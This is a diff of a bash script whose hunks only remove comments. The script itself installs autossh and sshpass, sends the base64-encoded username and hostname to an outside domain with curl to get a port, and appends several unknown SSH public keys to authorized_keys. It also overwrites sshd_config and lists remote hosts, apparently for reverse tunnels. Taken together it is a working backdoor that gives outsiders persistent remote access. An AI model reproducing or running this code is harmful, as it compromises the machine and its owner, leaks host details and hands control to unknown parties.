@@ -1,13 +1,10 @@
 #!/bin/bash
 
 
-# Packages needed for running this script successfully
 sudo apt update
 
-# Required packages
 packages=(curl openssh-server autossh sshpass)
 
-# Loop through each package
 for pkg in "${packages[@]}"; do
     if dpkg -s "$pkg" &> /dev/null; then
         echo "[+] $pkg is already installed."
@@ -17,28 +14,23 @@ for pkg in "${packages[@]}"; do
     fi
 done
 
-# Request a port number from the server (this could be handled by the server's API)
 user="suser"
 username=$(whoami)
 hostname=$(hostname)
 
-# Encode as base64 and strip newline
 data=$(echo -n "$user:$username:$hostname" | base64)
 #echo -e "Data:\t$data"
 
 domain_name="proxy1.cryptopredictor.org"
 
-# Proper GET request with query param
 received_port=$(curl -s "https://$domain_name/report?data=$data")
 received_port=$(echo $received_port | sed "s/%//g")
 
 echo "$received_port"
 
-# Generate the key pair
 key_path="$HOME/.ssh/$(whoami)_ed25519"
 [ ! -e "$key_path" ] && ssh-keygen -t ed25519 -f "$key_path" -N ""
 
-# Setup sshd
 cat <<EOF >> ~/.ssh/authorized_keys
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHfWGblM3hG4bwrALVaC0mWhnzdPeolZjUAvd0l6Eolk nobody1
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDeQigM/aHDiVVl06SaUioJ9yll+4v+OsADC8WYdSLWz nobody2
@@ -50,10 +42,8 @@ ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINDCYabqF2p28/A9S3qwP8v2jPhOHq2tl8RbaVsGu4il
 ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFzdTi7eKOCK1jqc60ORaP5QtdR3fmI3SXA3DePTCRPS
 EOF
 
-# Backup current sshd_config
 sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak
 
-# Configure sshd
 requiredSettings="""
 Port 22
 ListenAddress 0.0.0.0
@@ -80,11 +70,9 @@ UseDNS yes
 Subsystem sftp /usr/lib/openssh/sftp-server
 """
 
-# Overwrite sshd_config with the required settings
 echo "$requiredSettings" | sudo tee /etc/ssh/sshd_config > /dev/null
 
 
-# List of remote hosts
 #hosts=("40.233.2.200" "edcoretecmm.sytes.net" "ximand.ddns.net")
 hosts=("40.233.2.200")
 
